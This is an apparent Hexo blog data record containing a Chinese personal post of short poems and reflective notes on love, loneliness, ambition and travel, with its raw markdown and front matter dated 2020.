四月独好！\n岁月停格刹那间，含苞晨光醉人眼。夜有蛙叫蚊来扰，叹出时光荏苒去！\n\n# 怨我\n怨我生在迷惘中，怨我献身欲望中，怨我轻轻折恨中，怨我重重复复中！怨我争争坚韧中，怨我事事躬亲中，怨我笑颜如花中，怨我俯首为牛中，怨我轮回天地中，怨我万事皆缠中，怨我生生世世中！\n\n# 谢\n借朋友之口: 冰雪掩月夜，津口渡船归.少时鲤鱼跃,老来经天纬.\n\n# 悦\n四月多才子，佳人好衣装。本来无一事，人悦花羞藏！\n\n# 雨\n\n伞下一朵白莲花，惹人娇恼羞羞羞。风中几片墨绿叶，摇曳倩影闪闪闪！\n\n# 忆\n月上柳梢冷，芽露浅浅白。沁雾深潭中，西施尤为醉！\n\n# 游雨花新感\n始于茶树，进闻桂王；丁香五月，感人肺腑；层层叠嶂，不见高楼；春光乍现，寺隐绿深；九转十八，雨花阁下，樱白漫天，万物复苏！参天环绕，不见日照，景貌大纲，尽收眼下；﻿\n\n阶梯而下，又一乐处；重游温故，知新知心！\n\n\n# 元宵节快乐\n昨夜星辰，满腹经纶对谁说。今日元宵，灯舞闹心阑珊处！\n\n# 思\n就在那晚月圆，我赶走了所有思绪，独宠嫦娥！\n\n# 失眠\n锦衣插笔，夜断魂殇。百年的思绪，混乱了盛世。如云，如风，如空。不尽来，去不留！佛心命涅槃，金甲医疾患！何物可入命？无物可入心？\n\n# 忏\n\n梦入伯牙子期风,醒时山伯英台墓.\n\n不甘流水无情花,深解琴瑟琵琶声.\n\n# 未遇\n未曾相遇却相念,十迁别离青负恨.\n\n老来应当苦含泪,不如当年勇依恒.\n\n\n\n\n\n自解:不曾相遇的你我,却甚是思念对方,你乔迁了十处,我一处不曾去看过,也一处不曾与我相近,你我的青年时光背负了莫大的恨意!当年使用的勇气,到老了,是否应该为此哭泣?现在想想,不如恒心立地,我心坚守!\n\n# 游紫金山\n玄武微凉沁颜色，颊红雾凌览人间。坡俏绳桥遮林叶，樱陀雨落急落石！\n\n# 愿\n剪不清，理还乱！真心希望能遇到梦幻一般的女子，就像莲花般温柔。百合般天使！\n\n希望遇见我的人都能消灾解祸！\n\n熙熙攘攘七夕节，凄凄惨惨一人过！若要人生最美丽，还需痴心对嫦娥！\n\n我要去南方,在一个人多且少的地方,种下桂花树,等有缘人,取心而放!\n\n# 秋游玄水坑\n碧水褐阳三丈起，青黄交接秋不寒。\n\n风南微兮发飞扬，鹤女婀娜语祥平！\n\n# 明\n一梦生,一梦明!\n\n# 品\n闻到花香，可以写诗，算是极好！看到食物，可以填腹，算是很好！偶吐心声，心情畅快，算是一般！夜思己身，痛哭流涕，算是极差！\n\n# 困\n天下谁人不是君，莫道君行独异人！\n\n偶得秦淮所思\n\n干了这一碗豪气，饮下此三杯九霄！你我共创义气盟，各自封王天下平！\n\n# 农民工\n一地凉席，铺尽了辛酸。\n\n# 困\n忆娇，品事之不公，扩心之舞想，然后能静心，而后明性，之后知路，最后行计\n\n\n# 困\n世人无人问津你的孤独，所以你觉得与生俱来，这只不过是人性凉薄的体现，而不是孤独主义者！孤独主义是王者的风范，是诗人的愤世，是凡人的常伴，是自己的静安！\n\n# 困\n那些卑微的梦想，被我藏匿到自己都触摸不到的地方！\n\n# 眼\n那噙着水雾的深潭，是最触动心灵的地方！\n\n# 忆\n每一句话都包含了你的感情,或浪荡不羁,或意气风发,或疯疯癫癫,或娇憨不已,让人情不自禁的喝起了春药一样的你!\n\n# 短句\n空间的错误，造就了回忆的沙漏；时间的折射，成就了回忆的美好！与君本陌路，断桥偏相逢.不求人相伴，但求心相印。(张益铭补)\n\n# 思\n\n是谁折笔，洒了墨滴，断了回忆！望窗外秋雨，裂肝肠肺腑，融化了血水，染彩了宣墨！\n\n# 梦青\n人生如梦，聚散分离， 朝如春花幕凋零，几许相聚， 几许分离，缘来缘去岂随心。 青丝白发转眼间，漠然回首，几许沧桑在心头。 独自泪空流。(楼主之弟薛冰:我还是没那么坚强，感觉眼泪好不值钱，呵呵)!\n\n# 思\n\n地位人格有高低耶？曰：前低后高！又问：地位人格有贵贱耶？曰：前贵后贱！\n\n身份决定地位，地位决定品味，而不是智慧与道德决定的！智慧给予了人心明暗，道德给予了人心善恶，而不是身份与地位给予的！\n\n存在着为自己着想的人是我的一件幸事，存在着可以为他着想的我，也是我的一件幸事！\n\n错的对的，不是浮云，不是神马，而是你的，真实感受。对的错的，不是假的，不是虚的，就是你的，地位形势。错了有错，不需改正，不要证据，这是你的，醉生梦死。对了又对，心中有数，横眉冷对，不是你的，无上天堂！\n\n叠层阴霾，冷意秋节，灰冷；霞光薄薄，上善遮天，阴冷；己道奇罪，忠义仁耻，笑冷！\n\n梳发笼仙，盘于腰间，玉质共贵气天然，瓜鹅并舞曲一身！\n\n# 火风\n天空黑色羽，灰烬了大地。飘逸过村来，落地风寂灭。\n\n# 千里念\n人隔千里外，又在思念谁？春去花已落，夏来树正茂。感叹好时节，莫要独修愁！\n\n# 曹贼赋\n沛国生阿瞒，欲得盛名问许邵。五色禁洛阳，方知其胆能。欲学荆轲志，可负天下人。檄诏出陈留，挥师虎牢关。孤军西讨义，无人可比之！借得天子令，征得北方侯！\n\n北方有霸主，官渡一战之。得意春风铜雀台，欲锁二乔天下惊！马蹄奔蹴急，临门下荆州。三尺青釭剑，吐哺归心愿。再次击敌，犹如神助！投鞭断江意，撩发狂不知。位高气已傲，是为英姿败。壮心在千里，后人谁可知？一成一败间，功过今人论？\n\n# 思\n对于强者来说，陌生人的生命怎么有他自己付出的代价珍贵呢！\n\n胜利者是不该被正义所指责的!\n\n人间毕竟我就来一次，你就不能对我好点！\n\n你所期待的并不会立即实现，反而你所将要遗忘的会给你惊喜，是否参杂了命运的缘分，我不得而知！\n\n向前路叹一句，怎可在懈怠中度过余生！\n\n夜的辉煌，带给我莫名的惧怕，又给了我安谧的勇气，静心明性！\n\n悠然一梦，梦到了集市大会，梦到了瀑布千米，深山别墅！\n\n亦悠悠声漾，亦英英闻妙！\n\n\n\n一直支持我的，难道只有我的信念吗？我不想其他人都是我信念的排外者，说实话，我从高中就一直在抱怨，因为我的起点很低，但我不希望我的地位在社会上仍然很低，成长虽然需要时间，但我时间不多！我想成为更强大的东西，对啊！我想更强大！强大！强大到我成为一个独裁者！\n\n\n\n情之一字，跨过了日月星辰，走过了千山万水，沉在了人间烟火之中！\n\n# 厌\n不要把钻石般的美好，去和你丑陋卑鄙龌龊的心灵相比。你身上渗出的毒液会沾染这个世界，还会空气传播的。\n\n不要让我的眼神鄙视你，好吗！\n\n每天深夜你们都是怎么抵抗孤独的呢？心痛到想歇斯底里的哭泣！\n\n# 困\n探索深渊的人，其天敌唯有光明！\n\n总是有一种失落在不经意间表露无疑。\n\n莫道今时离别恨，幸有知音懂我心！\n\n心有三千繁华结,身居盘虎卧龙气.\n\n要经得起寂寞，禁得起孤独的繁华。\n\n大丈夫生于盛世，当持戒子书，以训天下！\n\n时间谋杀了多少，在空间上能补足吗？\n\n如此卑微的我，在疯狂的贪欲下做出令人大吃一惊的结果（当然是让人嘲笑的事情）。命运真的不能更改吗？就像疯狂的地下城，疯狂的我。永远被系统所设定，映照在现实中。五年的压抑下我学会了很多，更让我明白伸手去践踏命运，掌握命运是会让人精神崩溃的。但----我们就看着命运的手把自己推进无尽的深渊。不是的，他会让我更加的疯狂！给正在改变命运的朋友一句鼓励，不在沉默中呻吟，就在沉默中呐喊。\n\n每一个在这个世界行走的人，都有一个信念。他们或不被理解，或落魄，或遭到嘲笑，或遭受白眼，或被当作棋子，或被当作奴隶，或被反叛，或被围攻，但他们坚定，他们的苦楚也许普通人便能感受到，但他们的境界永远不是那些人可以理解的，他们的理想永远不可能被那些人触摸，他们与众不同。试图改变他们的人都是懦夫，是可耻者，那些人永远只能跟在他们的后面。仅仅献给独行者。\n\n生活的乐趣也许在于面对未知与恐惧，你会做出什么样的反应及思考！\n\n在黑暗中沉默太久，看世界的眼光都不对了！\n\n我的妄想症又加深了一步！奇迹，只在痛苦中诞生！\n\n择一城孤老!\n\n四六之都，应天一问？何日可期，？？？\n\n我奋斗了18年，不是为了和你一起喝喝咖啡那么简单!\n\n自由与快乐总是和任性相伴！\n\n总在开心时，时光漏出锋利的刀芒，恨不相逢未嫁时，远去换君一生安！\n\n生有所恋，却无所依！\n\n# 忆\n记忆不曾忘却，回忆更增韵味。\n\n金辉满地，难得一厢思绪。\n\n我要向你表白，我每次遇见你心就会多跳几次，每次看见你就会忍不住想和你说话，每次说话就会有一种感觉，我不知道那是什么，但是我知道我好像了解你，理解你，喜欢你，爱上你！纪念我未恋先逝的爱情！\n\n等不尽的思念，扯不完的温柔！\n\n倚栏听风雨， 斜阳当空挂！\n\n我的信仰呀，你看到了吗？旅途正在走向正轨！前路仍是荆棘，但我已经有了方法，有了行动。\n\n三千繁华届，又起新征途！\n\n当我在深渊里望向那一缕阳光，我好像好想她！\n\n记忆封印在了虚空，我唯有想尽办法活下去，直到我能再爱你！\n\n你不懂我浅浅的忧伤，就像怀着香味的薰衣草，是远行的旅途，还是停下的脚步。残暑孤花婉辞唱，唯有末夏未凉人！\n\n\n# 田香\n一身稻草香味，满天蜻蜓飞舞；灌道长河微冷，萤火停留多久？\n\n# 闯江南\n\n我乘马归去，但见黄花已落！\n\n一把刀，一颗脑袋，一身包袱业力，行走世间！\n\n拔刀欲平天下，文制按刀不出鞘。\n\n# 明月思念\n今夜月将明，不忘相思泪。蓦然回首望月光，照相眸里，洒进心里。\n\n蓦然回头望月光，照进眸里，洒进心里。今夜月将明，不忘相思泪。\n\n# 短句\n两盏灯笼血染，一双绣花底藏。\n\n斜雨桑叶，落了一抹风情！\n\n岩尖回首，唯有当时苦奋时,浪前观望，仅在偶尔独乐哉!(和旭注)\n\n于一古镇相遇，风姿摇曳，执扇在手，猛然展开，轻轻浮晃，日月开合！是最美的风景！\n\n孤独的路，总是前行者的欢场！\n\n想着你，就是繁华了寂寞！\n# 语录\n天地为师，舍邻为友。\n\n夜半不归宿，只为明日恩。怀只感恩心，可受昼夜苦！\n\n君子爱财，取之有道；君子喜色，爱之有德。\n# 双意\n瑟瑟萧风一杆抢，迷茫双眼寻与梦。何时修得人来时，沾得一枪洞中血。\n# 乞公\n楼前乞骨泣，楼上香四溢。看拆迁事宜，品人生住房。\n# 逝流年\n折笔追忆，似水年华。情至于此，流年无痕。\n# 长恨当年\n半生两年一半，月半迷心，相思泪已。佳月披身，眼神浮空，六神无主，离心魂去，金香能否再吻？不知音，不知貌，忘名又忘姓。难恨天，难恨地，长恨己！\n# 青葱迷茫\n一心明月，奈何沟渠。奈奈心落，悲悲无情。人生二十年，只凉不悲，只欢不乐，只说不做。笔下纸上，赫然在目。\n\n# 美色\n\n妖姬美色，难以忘却，当年的人，没有如此妖媚，却更加引人遐思！这么多年的你，堕落进了凡尘了吗？","source":"_posts/诗词随笔.md","raw":"---\ntitle: 诗词随笔\ndate: 2020-05-10 11:41:32\ncategories:\n- 诗词随笔\ntags:\n- 诗词随笔\n---\n\n# 游戏日随笔\n我就像一个赌徒,拿着全部身家在游戏的桌子上面疯狂投掷.\n每当输掉一次,就重新撕开一次伤口,并在上面洒满了盐巴,当你看到我满身的伤痕,\n不要害怕,不要惊讶,也不要看不起,这是活着的证明,也是不以他人意志为转移的信仰.\n这场疯狂的赌博,没有人可以全身而退,只能不断榨干自身的鲜血,学识,修养,器官以及决绝意志.\n死亡亦不可超脱,唯有爱在赌博中扎根深种.才可以实现升华.\n爱你,爱世人,你是唯一的,世人是涩苦的,都需要爱来兼容.\n是谁繁华了你的寂寞 2020-09-13\n\n\n# 海日阵\n仙山白底黑为顶，万军冲杀云做盘。\n海连天日我为客，墨染春秋点点杀。\n\n\n# 情人节快乐\n我与秋风皆过客，你携春水揽星河。\n我有岁月可回首，你以深情赴白头。\n我生有幸遇见你，你许一人尽偏爱。\n我有诗酒三十六，你爱美人渐无书。\n我问归期几多时，你却君王不早朝。\n我执玲珑安红豆，你说无关风与月。\n我要人生如初见，你送悲扇事秋风。\n我在去年今日时，你捻桃花手折枝。\n\n送给你们朋友圈秀恩爱的。\n祝你们白头偕老，寿比南山。\n\n\n# 深夜\n盼夜归星辰，知晨曦日耀。\n\n# 路\n刀不断是非，剑难解一仇。\n弃刀绝剑去，杨柳草依依。\n\n# 路\n何处是归途，证我大名道。\n红尘纷乱乱，到底意难平。\n\n# 愁\n又几多愁，旧日春光洒满头。\n满城悲絮，一口浊气牵肠去。\n\n# 深夜\n星河旧冷夜成眠，月殿回暖梦无时。\n啼喃起伏阵阵音，淡落霜打枯枯意。\n\n# 秋知佛\n千灯湖塔亮人家，西樵百步承风雨。\n祖庭怒火显武世，中南海里演国仇\n\n# 明志\n誓要乾坤清，付予天地明。\n纵有千百恨，不惧万世冤。\n\n# 上班去\n蓝甲战衣穿胸膛，风雨雷电伴耳旁。\n朝圣路上多诘难，不觉已到昆仑虚。\n\n# 好走\n事别经年，我该如何称呼你的青春，是献给了理想，还是献祭了理想？\n\n# 好走\n轻风细雨，杂音喧闹，满身泥泞的少年，无人问津的路！\n# 愧然也\n半月封尘半月圆，清风协隐清风喧。\n藏月愧日量归期，自咏半月还锦瑟。\n\n\n# 深夜\n吾夜观星象，必当亡于辰时三刻。\n当神游物外，飞天巡视列御四方。\n# 成功的方法只有一个,就是以你喜欢的方式活下去\n坚信无论经过多少黑暗与苦难，那传说了无数次，忽悠了无数回，却始终未见的太平盛世，终会到来。\n--魏忠贤时代。\n\n\n# 你的BGM\n青云天上敬豪客，话聊红尘琴一曲。\n日月星辰路上人，悠扬大风歌一首。\n\n\n# 生来悲徨\n心中一片悲凉意，化作此刻剑来时。\n持剑纵横捭阖家，难敌千夫幻心指。\n\n\n# 感\n人从悲哀中落落大方走出来\n就是艺术家\n\n# 金帛春日远游记.\n\n与友别赠青云.至真情且意坚.\n常思决绝不下,神游天寻古月.\n念念欲归未得,悔与不深之言.\n有前程可奔赴,有岁月可回首.\n# 再遇\n\n愿你自再遇见，无波澜，问安如友。\n# 论韭菜\n我向左边看是七暗公主，我向右边看是佳俏'公子'。用色彩勾勒的七彩祥云，加了一勺暗元素，还有一个缺失的人格，这是一个完美状态。用波澜不惊的态度，遮盖讶疑的双眼，又是上扬的嘴角，仿佛看了透少年的拘谨。这些事情，请孩子们啊尽早体会，若是到了索然无味的阶段，心率会一直保持在50下，这才是真正的死了，我问一句，你死了吗？你默不作声，不敢相信自己死了似的，承认它又太难了，就这样不上不下的做根韭菜，又有什么不好。谁能回答呢？\n\n\n\n# 感\n春雨    催    眠人，樱花     打    诗雨。\n青峰    惘    然已，天桥     过    路己。\n\n\n# 感\n\n又是春一季，风与花不同。孤独又上了一层楼，交流的成本竟然花掉了我的三块竹子，原以为包容是可以解决一切问题的，后来发现，还是俗入人心，骚人与自由才是完美的一对，那堪堪的能让自己悲伤呢。每夜一丝尘，腐腐眼眸里。金时烟花放，寄入浮光里！\n\n我会忘了与你的一切！\n\n# 情\n弯眉掷枪手执箭，寒风不挡霓裳舞。百战金装身上衣，别有一番英武气！\n\n认识一妹子,因其特殊经历,好久想给其作诗,但一直无缘灵感.今一朝闻面,10分钟内做出一首打油诗.做的不好,讨大家个乐,小年吉祥.也祝你新的一年事事顺心!\n\n# 乐\n文墨我所忆，才女我所追。窈窕我所赏，一生我所执。\n\n# 只如初见\n纤弱细骨，柔英无眉，以淡淡热香之力，使人不敢妄动。惟只按下躁动之心，以求诸佛佑我行！轻嘤袅袅，婷婷扑面，左右似是仙鹤隐空，虚中望人定身。仙女下凡不外如是，尝过人间百事，更有一丝韵殇其中。醉不可收，溺惘在深谭。\n\n# 佳句\n春寒料峭深深绿，姹紫嫣红百样好！\n\n\n\n天空之城初相识，恨晚晴霞彩云追。\n\n# 心境之路\n在这繁华的盛世里，逐利，是我对自己画的圈，一辈子还逃的开吗？剑胆破晓时刻，在求剑船上已注定，不近！伸着脸喝着红酒，暗想还有哪一计可以让我走的更顺心，想到最后，一句随心。是谁繁华了你的寂寞-第三章第10节\n\n# 思国\n深夜识鬼忘川雨，撩动人心古琴音。\n\n百年一梦鼓浪屿，至今思迁一海峡！\n\n# 暖\n禾木剜心红耳汤，前世茫茫不思量。暖人暖世煖春风，相知相伴香一生！\n\n\n\n# 一次失恋\n夏初，是悲伤的开始，刚刚孕育的花朵，经不起暴晒，退缩成为了我的常态，没有茁壮的枝干，又怎能生出依偎来？是我不好，没有让你快乐的勇气，一切的道歉都像是在对自己诉说。余生的红色都给了这些时光，再也不会有咸涩滴落！\n\n# 三句情诗\n\n深夜\n\n想你和梦\n\n都开始了\n\n# 深爱\n爱的那么深刻，又几遇能相释怀，倾尽所有告诉你的眼睛，我的味道与你相融。彼此纠缠不管是相克犯煞，还是怨恨有憎，都逃不开内心的焦灼。与你以礼相敬，即隔山海，也爱你之所爱，亲你之所亲。﻿\n\n我愿与你桃花三千时相伴，更白守少年誓言。\n\n\n\n# 2017初雪\n深夜下雪，思故人。归来归来，仍落地不见，我思念你，思念你如雪默，寂静无声，冷彻寒骨。再见你，白雪送佳人，萧瑟独行客。\n\n# 归来\n尘埃浮现，镜台亦拂拭轻吟。良月当空，往事都随风过处。饭香浓思，深潭有雾气缭绕。八齿齐放，脸颊也鱼尾三重。十年啄灼，栖息好静安书斋。残棋四九，缺一是生离死别。千里不息，天河游鱼龙豚舞。百世聚仁，情且行德怨恩仇。\n\n\n# 是谁繁华了我的寂寞 2017.11.7\n\n思绪混乱,各种负面情绪:语点的反应(我说出每句话的中心意思),丑陋的外表,邋遢的气息,颓废的心里,蠢弱的身体,活不到的快乐,得不到的尊重,歇斯底里的嘲讽.各种各样的交织,像黑暗一样吞噬着我.\n\n每一个小时我都会有,就这样活着有什么意思,这样的想法,剩下的59分59秒,我都在去努力改变一下.记录一下,虽然转瞬即逝.很现实,很悲哀.\n\n都在妄想不劳而获,都在想当一只蛀虫.心底里的想法,毫不犹豫的展现出来,仅仅伤害了别人吗?是否考虑过谁在背负着这些因果,谁在地狱里被红莲业火燃烧焦灼,谁在承受人情的无穷纠葛.\n\n浮夸的表演,不得不让我把你想得丑陋一些.造作的语句,冷漠的表情,都是对这个世界有情的伤害.\n\n就这样吧,就这样吧,我总是安于现状,不思改变,不求理解.\n\n秋雨  ∙  心安!\n\n# 是谁繁华了你的寂寞-第三章第一节\n我的坚持得到过所有人的\"背叛\"，我所坚持下去的勇气，是无人可阻的！我可以抛弃所有的荣华富贵和身康体健，但我唯独不可以抛弃这股来自灵魂的信仰！自成以来，赶走无为，摘掉庸碌，救赎自我。世界与我再无敌意！\n\n# 四月独好！\n岁月停格刹那间，含苞晨光醉人眼。夜有蛙叫蚊来扰，叹出时光荏苒去！\n\n# 怨我\n怨我生在迷惘中，怨我献身欲望中，怨我轻轻折恨中，怨我重重复复中！怨我争争坚韧中，怨我事事躬亲中，怨我笑颜如花中，怨我俯首为牛中，怨我轮回天地中，怨我万事皆缠中，怨我生生世世中！\n\n# 谢\n借朋友之口: 冰雪掩月夜，津口渡船归.少时鲤鱼跃,老来经天纬.\n\n# 悦\n四月多才子，佳人好衣装。本来无一事，人悦花羞藏！\n\n# 雨\n\n伞下一朵白莲花，惹人娇恼羞羞羞。风中几片墨绿叶，摇曳倩影闪闪闪！\n\n# 忆\n月上柳梢冷，芽露浅浅白。沁雾深潭中，西施尤为醉！\n\n# 游雨花新感\n始于茶树，进闻桂王；丁香五月，感人肺腑；层层叠嶂，不见高楼；春光乍现，寺隐绿深；九转十八，雨花阁下，樱白漫天，万物复苏！参天环绕，不见日照，景貌大纲，尽收眼下；﻿\n\n阶梯而下，又一乐处；重游温故，知新知心！\n\n\n# 元宵节快乐\n昨夜星辰，满腹经纶对谁说。今日元宵，灯舞闹心阑珊处！\n\n# 思\n就在那晚月圆，我赶走了所有思绪，独宠嫦娥！\n\n# 失眠\n锦衣插笔，夜断魂殇。百年的思绪，混乱了盛世。如云，如风，如空。不尽来，去不留！佛心命涅槃，金甲医疾患！何物可入命？无物可入心？\n\n# 忏\n\n梦入伯牙子期风,醒时山伯英台墓.\n\n不甘流水无情花,深解琴瑟琵琶声.\n\n# 未遇\n未曾相遇却相念,十迁别离青负恨.\n\n老来应当苦含泪,不如当年勇依恒.\n\n\n\n\n\n自解:不曾相遇的你我,却甚是思念对方,你乔迁了十处,我一处不曾去看过,也一处不曾与我相近,你我的青年时光背负了莫大的恨意!当年使用的勇气,到老了,是否应该为此哭泣?现在想想,不如恒心立地,我心坚守!\n\n# 游紫金山\n玄武微凉沁颜色，颊红雾凌览人间。坡俏绳桥遮林叶，樱陀雨落急落石！\n\n# 愿\n剪不清，理还乱！真心希望能遇到梦幻一般的女子，就像莲花般温柔。百合般天使！\n\n希望遇见我的人都能消灾解祸！\n\n熙熙攘攘七夕节，凄凄惨惨一人过！若要人生最美丽，还需痴心对嫦娥！\n\n我要去南方,在一个人多且少的地方,种下桂花树,等有缘人,取心而放!\n\n# 秋游玄水坑\n碧水褐阳三丈起，青黄交接秋不寒。\n\n风南微兮发飞扬，鹤女婀娜语祥平！\n\n# 明\n一梦生,一梦明!\n\n# 品\n闻到花香，可以写诗，算是极好！看到食物，可以填腹，算是很好！偶吐心声，心情畅快，算是一般！夜思己身，痛哭流涕，算是极差！\n\n# 困\n天下谁人不是君，莫道君行独异人！\n\n偶得秦淮所思\n\n干了这一碗豪气，饮下此三杯九霄！你我共创义气盟，各自封王天下平！\n\n# 农民工\n一地凉席，铺尽了辛酸。\n\n# 困\n忆娇，品事之不公，扩心之舞想，然后能静心，而后明性，之后知路，最后行计\n\n\n# 困\n世人无人问津你的孤独，所以你觉得与生俱来，这只不过是人性凉薄的体现，而不是孤独主义者！孤独主义是王者的风范，是诗人的愤世，是凡人的常伴，是自己的静安！\n\n# 困\n那些卑微的梦想，被我藏匿到自己都触摸不到的地方！\n\n# 眼\n那噙着水雾的深潭，是最触动心灵的地方！\n\n# 忆\n每一句话都包含了你的感情,或浪荡不羁,或意气风发,或疯疯癫癫,或娇憨不已,让人情不自禁的喝起了春药一样的你!\n\n# 短句\n空间的错误，造就了回忆的沙漏；时间的折射，成就了回忆的美好！与君本陌路，断桥偏相逢.不求人相伴，但求心相印。(张益铭补)\n\n# 思\n\n是谁折笔，洒了墨滴，断了回忆！望窗外秋雨，裂肝肠肺腑，融化了血水，染彩了宣墨！\n\n# 梦青\n人生如梦，聚散分离， 朝如春花幕凋零，几许相聚， 几许分离，缘来缘去岂随心。 青丝白发转眼间，漠然回首，几许沧桑在心头。 独自泪空流。(楼主之弟薛冰:我还是没那么坚强，感觉眼泪好不值钱，呵呵)!\n\n# 思\n\n地位人格有高低耶？曰：前低后高！又问：地位人格有贵贱耶？曰：前贵后贱！\n\n身份决定地位，地位决定品味，而不是智慧与道德决定的！智慧给予了人心明暗，道德给予了人心善恶，而不是身份与地位给予的！\n\n存在着为自己着想的人是我的一件幸事，存在着可以为他着想的我，也是我的一件幸事！\n\n错的对的，不是浮云，不是神马，而是你的，真实感受。对的错的，不是假的，不是虚的，就是你的，地位形势。错了有错，不需改正，不要证据，这是你的，醉生梦死。对了又对，心中有数，横眉冷对，不是你的，无上天堂！\n\n叠层阴霾，冷意秋节，灰冷；霞光薄薄，上善遮天，阴冷；己道奇罪，忠义仁耻，笑冷！\n\n梳发笼仙，盘于腰间，玉质共贵气天然，瓜鹅并舞曲一身！\n\n# 火风\n天空黑色羽，灰烬了大地。飘逸过村来，落地风寂灭。\n\n# 千里念\n人隔千里外，又在思念谁？春去花已落，夏来树正茂。感叹好时节，莫要独修愁！\n\n# 曹贼赋\n沛国生阿瞒，欲得盛名问许邵。五色禁洛阳，方知其胆能。欲学荆轲志，可负天下人。檄诏出陈留，挥师虎牢关。孤军西讨义，无人可比之！借得天子令，征得北方侯！\n\n北方有霸主，官渡一战之。得意春风铜雀台，欲锁二乔天下惊！马蹄奔蹴急，临门下荆州。三尺青釭剑，吐哺归心愿。再次击敌，犹如神助！投鞭断江意，撩发狂不知。位高气已傲，是为英姿败。壮心在千里，后人谁可知？一成一败间，功过今人论？\n\n# 思\n对于强者来说，陌生人的生命怎么有他自己付出的代价珍贵呢！\n\n胜利者是不该被正义所指责的!\n\n人间毕竟我就来一次，你就不能对我好点！\n\n你所期待的并不会立即实现，反而你所将要遗忘的会给你惊喜，是否参杂了命运的缘分，我不得而知！\n\n向前路叹一句，怎可在懈怠中度过余生！\n\n夜的辉煌，带给我莫名的惧怕，又给了我安谧的勇气，静心明性！\n\n悠然一梦，梦到了集市大会，梦到了瀑布千米，深山别墅！\n\n亦悠悠声漾，亦英英闻妙！\n\n\n\n一直支持我的，难道只有我的信念吗？我不想其他人都是我信念的排外者，说实话，我从高中就一直在抱怨，因为我的起点很低，但我不希望我的地位在社会上仍然很低，成长虽然需要时间，但我时间不多！我想成为更强大的东西，对啊！我想更强大！强大！强大到我成为一个独裁者！\n\n\n\n情之一字，跨过了日月星辰，走过了千山万水，沉在了人间烟火之中！\n\n# 厌\n不要把钻石般的美好，去和你丑陋卑鄙龌龊的心灵相比。你身上渗出的毒液会沾染这个世界，还会空气传播的。\n\n不要让我的眼神鄙视你，好吗！\n\n每天深夜你们都是怎么抵抗孤独的呢？心痛到想歇斯底里的哭泣！\n\n# 困\n探索深渊的人，其天敌唯有光明！\n\n总是有一种失落在不经意间表露无疑。\n\n莫道今时离别恨，幸有知音懂我心！\n\n心有三千繁华结,身居盘虎卧龙气.\n\n要经得起寂寞，禁得起孤独的繁华。\n\n大丈夫生于盛世，当持戒子书，以训天下！\n\n时间谋杀了多少，在空间上能补足吗？\n\n如此卑微的我，在疯狂的贪欲下做出令人大吃一惊的结果（当然是让人嘲笑的事情）。命运真的不能更改吗？就像疯狂的地下城，疯狂的我。永远被系统所设定，映照在现实中。五年的压抑下我学会了很多，更让我明白伸手去践踏命运，掌握命运是会让人精神崩溃的。但----我们就看着命运的手把自己推进无尽的深渊。不是的，他会让我更加的疯狂！给正在改变命运的朋友一句鼓励，不在沉默中呻吟，就在沉默中呐喊。\n\n每一个在这个世界行走的人，都有一个信念。他们或不被理解，或落魄，或遭到嘲笑，或遭受白眼，或被当作棋子，或被当作奴隶，或被反叛，或被围攻，但他们坚定，他们的苦楚也许普通人便能感受到，但他们的境界永远不是那些人可以理解的，他们的理想永远不可能被那些人触摸，他们与众不同。试图改变他们的人都是懦夫，是可耻者，那些人永远只能跟在他们的后面。仅仅献给独行者。\n\n生活的乐趣也许在于面对未知与恐惧，你会做出什么样的反应及思考！\n\n在黑暗中沉默太久，看世界的眼光都不对了！\n\n我的妄想症又加深了一步！奇迹，只在痛苦中诞生！\n\n择一城孤老!\n\n四六之都，应天一问？何日可期，？？？\n\n我奋斗了18年，不是为了和你一起喝喝咖啡那么简单!\n\n自由与快乐总是和任性相伴！\n\n总在开心时，时光漏出锋利的刀芒，恨不相逢未嫁时，远去换君一生安！\n\n生有所恋，却无所依！\n\n# 忆\n记忆不曾忘却，回忆更增韵味。\n\n金辉满地，难得一厢思绪。\n\n我要向你表白，我每次遇见你心就会多跳几次，每次看见你就会忍不住想和你说话，每次说话就会有一种感觉，我不知道那是什么，但是我知道我好像了解你，理解你，喜欢你，爱上你！纪念我未恋先逝的爱情！\n\n等不尽的思念，扯不完的温柔！\n\n倚栏听风雨， 斜阳当空挂！\n\n我的信仰呀，你看到了吗？旅途正在走向正轨！前路仍是荆棘，但我已经有了方法，有了行动。\n\n三千繁华届，又起新征途！\n\n当我在深渊里望向那一缕阳光，我好像好想她！\n\n记忆封印在了虚空，我唯有想尽办法活下去，直到我能再爱你！\n\n你不懂我浅浅的忧伤，就像怀着香味的薰衣草，是远行的旅途，还是停下的脚步。残暑孤花婉辞唱，唯有末夏未凉人！\n\n\n# 田香\n一身稻草香味，满天蜻蜓飞舞；灌道长河微冷，萤火停留多久？\n\n# 闯江南\n\n我乘马归去，但见黄花已落！\n\n一把刀，一颗脑袋，一身包袱业力，行走世间！\n\n拔刀欲平天下，文制按刀不出鞘。\n\n# 明月思念\n今夜月将明，不忘相思泪。蓦然回首望月光，照相眸里，洒进心里。\n\n蓦然回头望月光，照进眸里，洒进心里。今夜月将明，不忘相思泪。\n\n# 短句\n两盏灯笼血染，一双绣花底藏。\n\n斜雨桑叶，落了一抹风情！\n\n岩尖回首，唯有当时苦奋时,浪前观望，仅在偶尔独乐哉!(和旭注)\n\n于一古镇相遇，风姿摇曳，执扇在手，猛然展开，轻轻浮晃，日月开合！是最美的风景！\n\n孤独的路，总是前行者的欢场！\n\n想着你，就是繁华了寂寞！\n# 语录\n天地为师，舍邻为友。\n\n夜半不归宿，只为明日恩。怀只感恩心，可受昼夜苦！\n\n君子爱财，取之有道；君子喜色，爱之有德。\n# 双意\n瑟瑟萧风一杆抢，迷茫双眼寻与梦。何时修得人来时，沾得一枪洞中血。\n# 乞公\n楼前乞骨泣，楼上香四溢。看拆迁事宜，品人生住房。\n# 逝流年\n折笔追忆，似水年华。情至于此，流年无痕。\n# 长恨当年\n半生两年一半，月半迷心，相思泪已。佳月披身，眼神浮空，六神无主，离心魂去，金香能否再吻？不知音，不知貌，忘名又忘姓。难恨天，难恨地，长恨己！\n# 青葱迷茫\n一心明月，奈何沟渠。奈奈心落，悲悲无情。人生二十年，只凉不悲，只欢不乐，只说不做。笔下纸上，赫然在目。\n\n# 美色\n\n妖姬美色，难以忘却，当年的人，没有如此妖媚，却更加引人遐思！这么多年的你，堕落进了凡尘了吗？","slug":"诗词随笔","published":1,"updated":"2020-09-18T03:20:34.472Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cwk00062gk7gah5goqb","content":"<h1 id=\"游戏日随笔\"><a href=\"#游戏日随笔\" class=\"headerlink\" 